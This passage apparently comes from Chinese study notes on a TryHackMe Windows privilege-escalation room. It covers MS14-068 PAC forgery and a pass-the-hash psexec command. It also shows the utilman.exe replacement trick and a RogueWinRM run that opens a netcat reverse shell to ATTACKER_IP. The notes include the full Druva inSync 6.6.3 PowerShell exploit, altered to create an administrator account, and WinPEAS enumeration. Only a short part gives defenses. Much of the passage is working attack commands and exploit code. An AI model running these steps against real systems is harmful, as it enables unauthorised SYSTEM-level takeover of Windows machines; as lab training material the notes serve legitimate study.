<p>3、漏洞产生原理<br>Client 在向 AS 发送请求时，可以设置一个名为 include-pac 的字段为 False，而后 AS 生成的 TGT 并不会含有PAC，该字段默认为 True。在 Client 收到不含 PAC 的 TGT 后，可以添加一个 PAC 放于TGS Request 的数据包中，而 TGS 收到这个请求的数据包时，仍能正确解析出放在 TGS Request 中其他位置的 PAC 信息，因为 KDC 允许用户使用这样的构造。</p>
<p>在 KDC 对 PAC 进行验证时，对于PAC中的签名算法，虽然原则上规定使用密钥加密的签名算法，但微软在实际场景中却允许 Client 指定任意签名算法。所以Client 构造一个PAC，其中添加高权限的User SID 与 Group SID信息，并指定使用MD5进行签名，只要TGS Requset 数据不丢失，那么该伪造的 PAC 就能被验证通过。</p>
<p>PAC 验证通过后，KDC 会将 PAC 中的 User SID、Group SID 取出来，重新使用KDC用户（krbtgt） 的 NTLM Hash 和 Server 的 NTLM Hash 分别生成两个新的签名。之后生成一个新的 TGT ，并把 PAC放入其中，加密后发送给 Client，而不是发送 Ticket 给Client。</p>
<p><img src="/../imgs/$%7Bfiilename%7D/ebef05203431531694a4817c0574f91a.png" alt="img"></p>
<p>参考:[渗透测试中的域渗透之MS14-068域控提权+票据传递攻击PTT-CSDN博客](<a target="_blank" rel="noopener" href="https://blog.csdn.net/YhMjQx/article/details/146234992#:~:text=%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB%EF%BC%88Pass">https://blog.csdn.net/YhMjQx/article/details/146234992#:~:text=票据传递攻击（Pass</a> The Ticket，PTT）是一种使用 Kerberos 票据代替明文密码或 NTLM 哈希的方法。,PTH基于 NTLM 认证进行攻击，而 PTT 基于 Kerberos 协议进行攻击票据传递攻击，目的是伪造、窃取凭据提升权限。 常用的攻击方式：MS14-068、黄金票据、白银票据等。)</p>
<p>[域渗透-哈希传递攻击(Pass The Hash&#x2F;Key) - 知乎](<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/472019671#:~:text=%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92">https://zhuanlan.zhihu.com/p/472019671#:~:text=哈希传递</a> (pth)攻击是指攻击者可以通过捕获密码的hash值 (对应着密码的值)%2C然后简单地将其传递来进行身份验证，以此来横向访问其他网络系统。 攻击者无须通过解密hash值来获取明文密码。,因为对于每个Session hash值都是固定的，除非密码被修改了 (需要刷新缓存才能生效)，所以pth可以利用身份验证协议来进行攻击。 攻击者通常通过抓取系统的活动内存和其他技术来获取哈希。)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@目标ip</span><br></pre></td></tr></table></figure>

<h4 id="SeTakeOwnership"><a href="#SeTakeOwnership" class="headerlink" title="SeTakeOwnership"></a>SeTakeOwnership</h4><p>SeTakeOwnership 权限允许用户获取系统上任何对象的所有权，包括文件和注册表项，这为攻击者提升权限提供了许多可能性，例如，我们可以搜索以 SYSTEM 运行的服务并获取该服务的可执行文件的所有权。但是，对于这项任务，我们将采取不同的路线。</p>
<p>要获得 SeTakeOwnership 权限，我们需要使用 “Open as administrator” 选项打开命令提示符。系统将要求我们输入密码以获取提升的控制台：</p>
<p><img src="/../imgs/$%7Bfiilename%7D/33303d0cde736589d2838ee894379ff2.png" alt="https:&#x2F;&#x2F;tryhackme-images.s3.amazonaws.com&#x2F;user-uploads&#x2F;5ed5961c6276df568891c3ea&#x2F;room-content&#x2F;33303d0cde736589d2838ee894379ff2.png"></p>
<p>进入命令提示符后，我们可以使用以下命令检查我们的权限：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\&gt; whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name                Description                              State</span><br><span class="line">============================= ======================================== ========</span><br><span class="line">SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working set           Disabled</span><br></pre></td></tr></table></figure>



<p>由于 Utilman 是以 SYSTEM 权限运行的，如果我们将原始的二进制文件替换为我们构建的payload文件，我们将有效地获得目标机的 SYSTEM 权限。 由于我们可以拥有任何文件的所有权，因此替换原始二进制文件是微不足道的。 要替换 utilman，我们将首先在目标机上使用以下命令获取它的所有权，具体命令和执行结果如下：</p>
<p>这次我们将滥用 utilman.exe 来提升权限。 Utilman 是一个内置的 Windows 应用程序，用于在计算机锁定屏幕期间 提供“轻松访问”选项：</p>
<p><img src="/../imgs/$%7Bfiilename%7D/a5437a609e41d982b320967667e9b97a.png" alt="https:&#x2F;&#x2F;tryhackme-images.s3.amazonaws.com&#x2F;user-uploads&#x2F;5ed5961c6276df568891c3ea&#x2F;room-content&#x2F;a5437a609e41d982b320967667e9b97a.png"></p>
<p>由于 Utilman 是以 SYSTEM 权限运行的，因此如果我们为任何我们喜欢的有效负载替换原始二进制文件，我们将有效地获得 SYSTEM 权限。由于我们可以拥有任何文件的所有权，因此替换它是微不足道的。</p>
<p>要替换 utilman，我们首先使用以下命令获取它的所有权：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\&gt; takeown /f C:\Windows\System32\Utilman.exe</span><br><span class="line"></span><br><span class="line">SUCCESS: The file (or folder): &quot;C:\Windows\System32\Utilman.exe&quot; now owned by user &quot;WINPRIVESC2\thmtakeownership&quot;.</span><br></pre></td></tr></table></figure>

<p>请注意，成为文件的所有者并不一定意味着您对它拥有权限，但作为所有者，您可以为自己分配所需的任何权限。要授予用户对 utilman.exe 的完全权限，您可以使用以下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\&gt; icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F</span><br><span class="line">processed file: Utilman.exe</span><br><span class="line">Successfully processed 1 files; Failed processing 0 files</span><br></pre></td></tr></table></figure>

<p>在此之后，我们将 utilman.exe 替换为 cmd.exe 的副本：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\&gt; copy cmd.exe utilman.exe</span><br><span class="line">        1 file(s) copied.</span><br></pre></td></tr></table></figure>

<p>要触发 utilman，我们将从开始按钮锁定屏幕：</p>
<p><img src="/../imgs/$%7Bfiilename%7D/dd7290ca93369cee33182023cb9190ff.png" alt="https:&#x2F;&#x2F;tryhackme-images.s3.amazonaws.com&#x2F;user-uploads&#x2F;5ed5961c6276df568891c3ea&#x2F;room-content&#x2F;dd7290ca93369cee33182023cb9190ff.png"></p>
<p>最后，继续单击“Ease of Access”按钮，该按钮utilman.exe SYSTEM 权限运行。由于我们将其替换为 cmd.exe 副本，因此我们将获得具有 SYSTEM 权限的命令提示符：</p>
<p><img src="/../imgs/$%7Bfiilename%7D/1401bc3dcb1e4eb84f526b95567a5ef8.png" alt="utilman shell"></p>
<h4 id="SeImpersonate-SeAssignPrimaryToken"><a href="#SeImpersonate-SeAssignPrimaryToken" class="headerlink" title="SeImpersonate &#x2F; SeAssignPrimaryToken"></a>SeImpersonate &#x2F; SeAssignPrimaryToken</h4><p>这些权限允许进程模拟其他用户并代表他们执行(即一个进程可以假装成另一个用户，并以该用户的权限执行操作。)。模拟通常包括能够在其他用户的安全上下文下生成进程或线程。(意味着这个新进程&#x2F;线程将继承被模拟用户的权限，而不是原始进程的权限。)</p>
<p>当您考虑 FTP 服务器的工作原理时，很容易理解模拟。FTP 服务器必须限制用户仅访问应允许他们查看的文件。</p>
<p>(FTP是用来在两台计算机之间传输文件，是Internet中应用非常广泛的服务之一，它可根据实际需要设置各用户的使用权限，同时还具有跨平台的特性，即在UNIX、Linux和Windows等操作系统中都可实现FTP客户端和服务器，相互之间可跨平台进行文件的传输。)</p>
<p>假设我们有一个 FTP 服务正在运行，用户为 <code>ftp</code>。在没有模拟的情况下，如果用户 Ann 登录到 FTP 服务器并尝试访问她的文件，FTP 服务将尝试使用其访问令牌而不是 Ann 的访问令牌来访问这些文件：</p>
<p><img src="/../imgs/$%7Bfiilename%7D/6e5768172fbb97d6777dde7e15a3fcfc.png" alt="img"></p>
<p>使用 ftp 的令牌不是最好的主意有几个原因：</p>
<ul>
<li><p>为了正确提供文件，<code>ftp</code> 用户需要可以访问它们。在上面的示例中，FTP 服务将能够访问 Ann 的文件，但不能访问 Bill 的文件，因为 Bill 文件中的 DACL 不允许用户使用 <code>ftp</code>。这增加了复杂性，因为我们必须为每个提供的文件&#x2F;目录手动配置特定权限。</p>
</li>
<li><p>对于作系统，所有文件都由用户 <code>ftp</code> 访问，而与当前登录到 FTP 服务的用户无关。这使得无法将授权委托给作系统;因此，FTP 服务必须实现它。</p>
</li>
<li><p>如果 FTP 服务在某个时候遭到入侵，攻击者将立即获得对 <code>ftp</code> 用户有权访问的所有文件夹的访问权限。</p>
</li>
</ul>
<p>另一方面，如果 FTP 服务的用户具有 SeImpersonate 或 SeAssignPrimaryToken 权限，则所有这些都会稍微简化，因为 FTP 服务可以临时获取登录用户的访问令牌，并使用它代表他们执行任何任务：</p>
<p><img src="/../imgs/$%7Bfiilename%7D/89e74e14454edc10fa2bd541ac359772.png" alt="img"></p>
<p>现在，如果用户 Ann 登录到 FTP 服务，并且 ftp 用户具有模拟权限，则它可以借用 Ann 的访问令牌并使用它来访问她的文件。这样，文件就不需要以任何方式向用户 <code>ftp</code> 提供访问权限，并且作系统会处理授权。由于 FTP 服务正在模拟 Ann，因此在该会话期间无法访问 Jude 或 Bill 的文件。</p>
<p>作为攻击者，如果我们设法使用 SeImpersonate 或 SeAssignPrimaryToken 权限控制进程，我们可以模拟连接到该进程并进行身份验证的任何用户。</p>
<p>(✅ <strong>攻击者需要利用 <code>SeImpersonatePrivilege</code> 或 <code>SeAssignPrimaryTokenPrivilege</code>，让进程可以模拟连接的用户。</strong><br> ✅ <strong>为了提权，攻击者必须找到方法让 SYSTEM 或管理员账户连接到该进程，并进行身份验证。</strong><br> ✅ <strong>常见方法包括创建恶意 Web 服务器、使用 COM 组件劫持（Juicy Potato）、利用命名管道劫持（PrintSpoofer）等。</strong></p>
<p>🚀 <strong>最终目标：攻击者通过 Token 窃取，把低权限账户提升为 SYSTEM，完全控制 Windows 机器！</strong>)</p>
<p>✅ <strong>Windows 系统中的 <code>LOCAL SERVICE</code> 和 <code>NETWORK SERVICE</code> 账户默认拥有 <code>SeImpersonatePrivilege</code>（模拟权限）。</strong><br> ✅ <strong>这些账户通常用于运行受限的系统服务，因此 Windows 允许它们在需要时模拟连接的用户，以便执行某些操作。</strong><br> ✅ <strong>IIS（Internet Information Services）会为 Web 应用创建默认账户 <code>IIS APPPOOL\DefaultAppPool</code>，它也具有类似的模拟权限。</strong></p>
<p>要使用此类帐户提升权限，攻击者需要满足以下条件：1. 生成一个进程，以便用户可以连接该进程并对其进行身份验证，以便进行模拟。2. 找到一种方法来强制特权用户连接并验证生成的恶意进程。</p>
<p>我们将使用 RogueWinRM 漏洞来实现这两个条件。</p>
<p>首先，假设我们已经入侵了在 IIS 上运行的网站，并且我们已经在以下地址植入了一个 Web shell：</p>
<p>我们可以使用 Web Shell 来检查被盗用账户的分配权限，并确认我们拥有此任务所需的两种权限：</p>
<p><img src="/../imgs/$%7Bfiilename%7D/4603506a36f4bbda602dc67cdc845d9f.png" alt="Webshell impersonate privileges"></p>
<p>要使用 RogueWinRM，我们首先需要将漏洞利用程序上传到目标计算机。为方便起见，这已经完成，您可以在 <code>C：\tools\</code> 文件夹中找到该漏洞。</p>
<p>RogueWinRM 漏洞利用是可能的，因为每当用户（包括非特权用户）在 Windows 中启动 BITS 服务时，它都会使用 SYSTEM 权限自动创建与端口 5985 的连接。端口 5985 通常用于 WinRM 服务，它只是一个公开 Powershell 控制台的端口，以便通过网络远程使用。可以将其视为 SSH，但使用 Powershell。</p>
<p>这段话解释了<strong>RogueWinRM 漏洞的核心原理</strong>，主要利用了 <strong>Windows BITS（后台智能传输服务）</strong> 的特性来劫持 SYSTEM 权限的连接，从而在 WinRM（Windows 远程管理）服务上实现提权。</p>
<h5 id="🔹-RogueWinRM-为什么可行？"><a href="#🔹-RogueWinRM-为什么可行？" class="headerlink" title="🔹 RogueWinRM 为什么可行？"></a><strong>🔹 RogueWinRM 为什么可行？</strong></h5><p>💡 <strong>关键点：</strong><br> 1️⃣ <strong>BITS（后台智能传输服务）</strong> 允许<strong>任何用户（包括低权限用户）启动它</strong>。<br> 2️⃣ <strong>当 BITS 服务启动时，它会以 SYSTEM 权限自动连接 WinRM（端口 5985）</strong>。<br> 3️⃣ <strong>WinRM 端口 5985 本质上是 Windows 的 SSH</strong>，提供远程 PowerShell 访问功能。<br> 4️⃣ <strong>攻击者可以利用这个自动连接劫持 SYSTEM 令牌，实现提权！</strong></p>
<p><strong>📌 1. BITS（Background Intelligent Transfer Service）</strong></p>
<ul>
<li>Windows 的后台文件传输服务，常用于<strong>Windows 更新、OneDrive 同步等任务</strong>。</li>
<li><strong>任何用户</strong>（包括普通用户）都可以手动启动 BITS 服务！</li>
<li><strong>当 BITS 运行时，它会自动以 SYSTEM 权限访问 WinRM（5985 端口）。</strong></li>
</ul>
<p><strong>📌 2. WinRM（Windows 远程管理，端口 5985）</strong></p>
<ul>
<li>WinRM 允许远程管理 Windows 计算机，本质上<strong>就是 PowerShell 远程管理的底层服务</strong>。</li>
<li>默认监听 <strong>TCP 5985（HTTP）和 5986（HTTPS）端口</strong>。</li>
<li><strong>可以用来执行远程 PowerShell 命令，类似于 SSH。</strong></li>
</ul>
<p><strong>📌 3. RogueWinRM 攻击原理</strong><br> ✅ <strong>第一步：创建恶意 WinRM 服务器</strong></p>
<ul>
<li>攻击者运行 <code>RogueWinRM.exe</code>，创建一个<strong>假 WinRM 服务器</strong>，监听本地 5985 端口。</li>
<li>这样，当 SYSTEM 级别的进程（如 BITS）尝试连接时，会不小心连接到<strong>攻击者控制的 WinRM 服务器</strong>。</li>
</ul>
<p>✅ <strong>第二步：启动 BITS 触发 SYSTEM 连接</strong></p>
<ul>
<li>低权限用户可以<strong>手动启动 BITS</strong>（因为 Windows 允许所有用户操作 BITS 服务）。</li>
<li>由于 BITS 启动后会自动以 SYSTEM 权限连接 5985，攻击者可以拦截该请求！</li>
</ul>
<p>✅ <strong>第三步：劫持 SYSTEM 令牌并提权</strong></p>
<ul>
<li><strong>当 SYSTEM 进程连接时，攻击者可以劫持其访问令牌（Token）。</strong></li>
<li><strong>最终，攻击者可以模拟 SYSTEM 账户，获得完整的系统控制权限！</strong></li>
</ul>
<p>如果由于某种原因，WinRM 服务未在受害者服务器上运行，攻击者可以在端口 5985 上启动虚假的 WinRM 服务，并在启动时捕获 BITS 服务进行的身份验证尝试。如果攻击者具有 SeImpersonate 权限，则他可以代表连接用户执行任何命令，即 SYSTEM。</p>
<p>在运行漏洞之前，我们将启动一个 netcat 侦听器，以便在攻击者的机器上接收反向 shell：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user@attackerpc$ nc -lvp 4442</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">然后，使用我们的 Web shell 使用以下命令触发 RogueWinRM 漏洞：</span><br><span class="line"></span><br><span class="line">c:\tools\RogueWinRM\RogueWinRM.exe -p &quot;C:\tools\nc64.exe&quot; -a &quot;-e cmd.exe ATTACKER_IP 4442&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/$%7Bfiilename%7D/24545e313a2e5ddee2386a68b4c7adeb.png" alt="RogueWinRM exploit execution"></p>
<p>**注意：**该漏洞可能需要长达 2 分钟才能起作用，因此您的浏览器可能会在一段时间内显示为无响应。如果您多次运行漏洞利用，则会发生这种情况，因为它必须等待 BITS 服务停止后才能再次启动它。BITS 服务将在启动 2 分钟后自动停止。</p>
<p><code>-p</code> 参数指定漏洞利用程序要运行的可执行文件，在本例中<code>为 nc64.exe</code>。<code>-a</code> 参数用于将参数传递给可执行文件。由于我们希望 nc64 建立一个针对攻击者机器的反向 shell，因此传递给 netcat 的参数将是 <code>-e cmd.exe ATTACKER_IP 4442</code>。</p>
<p>如果所有设置都已正确，您应该会得到一个具有 SYSTEM 权限的 shell：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user@attackerpc$ nc -lvp 4442</span><br><span class="line">Listening on 0.0.0.0 4442</span><br><span class="line">Connection received on 10.10.175.90 49755</span><br><span class="line">Microsoft Windows [Version 10.0.17763.1821]</span><br><span class="line">(c) 2018 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">c:\windows\system32\inetsrv&gt;whoami</span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>

<h5 id="🔹-如何防御-RogueWinRM？"><a href="#🔹-如何防御-RogueWinRM？" class="headerlink" title="🔹 如何防御 RogueWinRM？"></a><strong>🔹 如何防御 RogueWinRM？</strong></h5><p>🚨 <strong>1. 禁用 WinRM（如果不需要）</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制编辑</span><br><span class="line">Disable-PSRemoting -Force</span><br></pre></td></tr></table></figure>

<p>这样即使 BITS 以 SYSTEM 权限运行，它也不会连接到 5985 端口，攻击将失败。</p>
<p>🚨 <strong>2. 限制 BITS 服务的访问权限</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制编辑</span><br><span class="line">sc sdset bits D:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)</span><br></pre></td></tr></table></figure>

<p>这会限制只有 SYSTEM 账户能启动 BITS，防止低权限用户滥用。</p>
<p>🚨 <strong>3. 监控 BITS 启动日志</strong><br> BITS 运行时会在 Windows 事件日志中留下痕迹，可以监控并检测异常活动。</p>
<p>🚨 <strong>4. 关闭不必要的 IIS 站点或 Web 服务</strong><br> 因为很多 Web 服务器环境下 <code>SeImpersonatePrivilege</code> 默认可用，减少攻击面可降低风险。</p>
<h5 id="🔹-总结"><a href="#🔹-总结" class="headerlink" title="🔹 总结"></a><strong>🔹 总结</strong></h5><p>✅ <strong>RogueWinRM 通过 BITS 服务触发 SYSTEM 连接到 WinRM，进而劫持 SYSTEM 令牌，实现提权。</strong><br> ✅ <strong>利用 BITS 自动连接 5985（WinRM 端口）这一特性，让攻击者可以在低权限环境下轻松获取 SYSTEM 权限。</strong><br> ✅ <strong>防御措施包括禁用 WinRM、限制 BITS 权限、监控系统日志等，以降低攻击风险。</strong></p>
<p>💀 <strong>这个漏洞适用于 Windows 服务器环境，尤其是启用了 WinRM 和 BITS 的情况下，非常危险！</strong></p>
<h3 id="Abusing-vulnerable-software-滥用易受攻击的软件"><a href="#Abusing-vulnerable-software-滥用易受攻击的软件" class="headerlink" title="Abusing vulnerable software(滥用易受攻击的软件)"></a>Abusing vulnerable software(滥用易受攻击的软件)</h3><h4 id="Unpatched-Software-未修补的软件"><a href="#Unpatched-Software-未修补的软件" class="headerlink" title="Unpatched Software 未修补的软件"></a>Unpatched Software 未修补的软件</h4><p>在渗透测试或系统排查过程中，列出目标系统上已安装的软件及其版本信息，可能会发现<strong>存在已知漏洞的旧版本软件</strong>，从而提供**权限提升（Privilege Escalation）**的机会。例如：</p>
<ol>
<li><strong>未打补丁的软件</strong>：攻击者可以查找软件的 CVE（公共漏洞和暴露）记录，利用已知漏洞提升权限。</li>
<li><strong>过时的第三方驱动</strong>：某些软件会安装内核驱动，旧版驱动可能存在权限提升漏洞。</li>
<li><strong>错误的权限配置</strong>：某些软件目录或二进制文件的权限设置不当，可能被低权限用户修改或替换。</li>
</ol>
<p>相关命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic product get name,version,vendor</span><br></pre></td></tr></table></figure>

<p>该命令会列出所有已安装软件的名称（<code>name</code>）、版本号（<code>version</code>）以及供应商（<code>vendor</code>）。<strong>执行可能需要一分钟左右</strong>，因为它会遍历注册表项和 WMI 数据库，收集相关信息。</p>
<p>如果你在列出的软件中发现了过时的或有漏洞的版本，可以进一步查找是否存在已知的漏洞利用方式，例如本地提权漏洞（LPE, Local Privilege Escalation）。</p>
<p>请记住，<code>wmic product</code> 命令可能不会返回所有已安装的程序。根据某些程序的安装方式，它们可能不会在此处列出。检查桌面快捷方式、可用服务或通常表明存在可能易受攻击的其他软件的任何痕迹总是值得的。</p>
<h4 id="案例研究：Druva-inSync-6-6-3"><a href="#案例研究：Druva-inSync-6-6-3" class="headerlink" title="案例研究：Druva inSync 6.6.3"></a>案例研究：Druva inSync 6.6.3</h4><p>目标服务器正在运行 Druva inSync 6.6.3，据 <a target="_blank" rel="noopener" href="https://www.matteomalvica.com/blog/2020/05/21/lpe-path-traversal/">Matteo Malvica</a> 报告，该服务器容易受到权限提升的影响。该漏洞是由于对 <a target="_blank" rel="noopener" href="https://www.tenable.com/security/research/tra-2020-12">Chris Lyne</a> 最初报告的版本 6.5.0 的另一个漏洞应用了错误补丁造成的。</p>
<p>该软件容易受到攻击，因为它在端口 6064 上运行具有 SYSTEM 权限的 RPC（远程过程调用）服务器，只能从 localhost 访问。如果您不熟悉 RPC，它只是一种机制，它允许给定进程通过网络公开函数（在 RPC 术语中称为过程），以便其他计算机可以远程调用它们。</p>
<p>在 Druva inSync 的情况下，端口 6064 上公开的程序之一（特别是程序编号 5）允许任何人请求执行任何命令。由于 RPC 服务器以 SYSTEM 身份运行，因此任何命令都以 SYSTEM 权限执行。</p>
<p>版本 6.5.0 及更早版本中报告的原始漏洞允许不受限制地运行任何命令。提供此类功能背后的最初想法是远程执行 inSync 提供的一些特定二进制文件，而不是任何命令。尽管如此，没有进行检查以确保这一点。</p>
<p>发布了一个补丁，他们决定检查执行的命令是否以字符串 <code>C：\ProgramData\Druva\inSync4\</code> 开头，允许的二进制文件应该在其中。但后来证明这还不够，因为您可以简单地进行路径遍历攻击来绕过这种控制。假设你要执行 <code>C：\Windows\System32\cmd.exe</code>，它不在允许的路径中;您可以简单地要求服务器运行 <code>C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe</code> ，这将成功绕过检查。</p>
<p>要整合一个有效的漏洞利用，我们需要了解如何与端口 6064 通信。幸运的是，使用的协议很简单，要发送的数据包如下图所示：</p>
<p><img src="/../imgs/$%7Bfiilename%7D/ff706d6530426d3123c0983acd61f934.png" alt="Druva Exploit Diagram"></p>
<p>第一个数据包只是一个包含固定字符串的 hello 数据包。第二个数据包表示我们想要执行第 5 个过程，因为这是易受攻击的过程，它将为我们执行任何命令。最后两个数据包分别用于发送命令的长度和要执行的命令字符串。</p>
<p>最初由 Matteo Malvica <a target="_blank" rel="noopener" href="https://packetstormsecurity.com/files/160404/Druva-inSync-Windows-Client-6.6.3-Privilege-Escalation.html">在此处</a>发布，以下漏洞可在您的目标计算机中用于提升权限并检索此任务的标志。为方便起见，以下是原始漏洞利用程序的代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ErrorActionPreference = &quot;Stop&quot;</span><br><span class="line"></span><br><span class="line">$cmd = &quot;net user pwnd /add&quot;</span><br><span class="line"></span><br><span class="line">$s = New-Object System.Net.Sockets.Socket(</span><br><span class="line">    [System.Net.Sockets.AddressFamily]::InterNetwork,</span><br><span class="line">    [System.Net.Sockets.SocketType]::Stream,</span><br><span class="line">    [System.Net.Sockets.ProtocolType]::Tcp</span><br><span class="line">)</span><br><span class="line">$s.Connect(&quot;127.0.0.1&quot;, 6064)</span><br><span class="line"></span><br><span class="line">$header = [System.Text.Encoding]::UTF8.GetBytes(&quot;inSync PHC RPCW[v0002]&quot;)</span><br><span class="line">$rpcType = [System.Text.Encoding]::UTF8.GetBytes(&quot;$([char]0x0005)`0`0`0&quot;)</span><br><span class="line">$command = [System.Text.Encoding]::Unicode.GetBytes(&quot;C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd&quot;);</span><br><span class="line">$length = [System.BitConverter]::GetBytes($command.Length);</span><br><span class="line"></span><br><span class="line">$s.Send($header)</span><br><span class="line">$s.Send($rpcType)</span><br><span class="line">$s.Send($length)</span><br><span class="line">$s.Send($command)</span><br></pre></td></tr></table></figure>

<p>您可以弹出 Powershell 控制台并直接粘贴漏洞以执行它（该漏洞也可以在目标计算机 <code>C:\tools\Druva_inSync_exploit.txt</code> 中找到）。请注意，在 <code>$cmd</code> 变量中指定的漏洞利用的默认有效负载将在系统中创建一个名为 <code>pwnd</code> 的用户，但不会为他分配管理权限，因此我们可能希望将有效负载更改为更有用的内容。对于此 room，我们将更改 payload 以运行以下命令：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">net user pwnd SimplePass123 /add &amp; net localgroup administrators pwnd /add</span><br></pre></td></tr></table></figure>

<p>这将创建密码为 <code>SimplePass123</code> 的用户 <code>pwnd</code> 并将其添加到管理员组。如果漏洞利用成功，您应该能够运行以下命令来验证用户 <code>pwnd</code> 是否存在并且是管理员组的一部分：</p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20250320182713906.png" alt="image-20250320182713906"></p>
<h3 id="Tools-of-the-Trade-发现工具"><a href="#Tools-of-the-Trade-发现工具" class="headerlink" title="Tools of the Trade 发现工具"></a>Tools of the Trade 发现工具</h3><h4 id="WinPEAS"><a href="#WinPEAS" class="headerlink" title="WinPEAS"></a>WinPEAS</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">工具下载:</span><br><span class="line">curl -L -o winPEAS.exe https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany_ofs.exe</span><br></pre></td></tr></table></figure>

<p><strong>WinPEAS（Windows Privilege Escalation Awesome Scripts）</strong> 是一个<strong>自动化枚举工具</strong>，用于<strong>查找 Windows 目标系统中的潜在权限提升向量</strong>。它会执行一系列检查，寻找可能的漏洞或错误配置，从而帮助攻击者或渗透测试人员找到可以利用的安全问题。</p>
<p><strong>如何使用 WinPEAS</strong></p>
<ol>
<li><p><strong>下载 WinPEAS</strong> 你可以从 GitHub 获取 WinPEAS：</p>
<ul>
<li><p>GitHub 主页：<a target="_blank" rel="noopener" href="https://github.com/carlospolop/PEASS-ng">https://github.com/carlospolop/PEASS-ng</a></p>
</li>
<li><p>直接下载可执行文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>在目标系统上执行 WinPEAS</strong> 由于 WinPEAS 输出可能<strong>非常冗长</strong>，建议将结果保存到文件中，以便后续分析：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">winPEASx64.exe &gt; output.txt</span><br></pre></td></tr></table></figure>

<p>或者，如果你使用的是 <strong>PowerShell</strong>，可以运行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.\winPEASx64.exe | Tee-Object -FilePath output.txt</span><br></pre></td></tr></table></figure></li>
</ol>
<hr>
<p><strong>WinPEAS 枚举的关键信息</strong></p>
<p>WinPEAS 主要关注以下几个方面：</p>
<p><strong>1. 系统信息</strong></p>
<ul>
<li>Windows 版本</li>
<li>内核版本</li>
<li>计算机名称</li>
<li>当前用户及权限</li>
</ul>
<p><strong>2. 用户和组</strong></p>
<ul>
<li>当前用户属于哪些本地组</li>
<li>是否有 <code>SeImpersonatePrivilege</code>（可能导致 <code>Juicy Potato</code> 攻击）</li>
<li>是否属于 <code>Administrators</code> 组</li>
</ul>
<p><strong>3. 运行进程</strong></p>
<ul>
<li>以高权限运行的进程</li>
<li>进程是否加载了<strong>可写入的 DLL</strong>（DLL 劫持）</li>
</ul>
<p><strong>4. 服务</strong></p>
<ul>
<li>是否有<strong>可写的 Windows 服务</strong></li>
<li>是否有<strong>自动运行的高权限服务</strong></li>
</ul>
<p><strong>5. 注册表</strong></p>
<ul>
<li>是否存在存储密码的注册表项</li>
<li>是否有 <code>AlwaysInstallElevated</code>（可用于安装 SYSTEM 权限的 MSI）</li>
</ul>
<p><strong>6. 计划任务</strong></p>
<ul>
<li>是否有可写的计划任务（可用于执行 SYSTEM 级 payload）</li>
</ul>
<p><strong>7. 可执行文件</strong></p>
<ul>
<li>是否有可写入的 <code>C:\Program Files</code> 目录</li>
<li>是否有 <code>Unquoted Service Path</code>（未加引号的服务路径漏洞）</li>
</ul>
<p><strong>8. 其他漏洞</strong></p>
<ul>
<li>是否存在<strong>已知的可利用漏洞</strong></li>
<li>是否安装了<strong>过时或易受攻击的软件</strong></li>
<li>是否存在<strong>可写的 <code>schtasks</code> 任务</strong></li>
</ul>
<hr>
<p><strong>分析 WinPEAS 输出</strong></p>
<p>WinPEAS 生成的输出可能很长，但你可以使用以下关键字快速定位可能的漏洞：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">findstr /i &quot;Privilege Service Writable User Vulnerable&quot; output.txt</span><br></pre></td></tr></table></figure>

<p>或者使用 PowerShell：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Select-String -Path output.txt -Pattern &quot;Privilege|Service|Writable|User|Vulnerable&quot;</span><br></pre></td></tr></table></figure>

<p>运行 <code>winPEASx64.exe</code> 可能会发现类似以下的结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[+] Modifiable Service</span><br><span class="line">    [?] Service Name: VulnerableService</span><br><span class="line">    Path: C:\Program Files\VulnerableApp\service.exe</span><br><span class="line">    StartType: Auto</span><br><span class="line">    User: LocalSystem</span><br></pre></td></tr></table></figure>

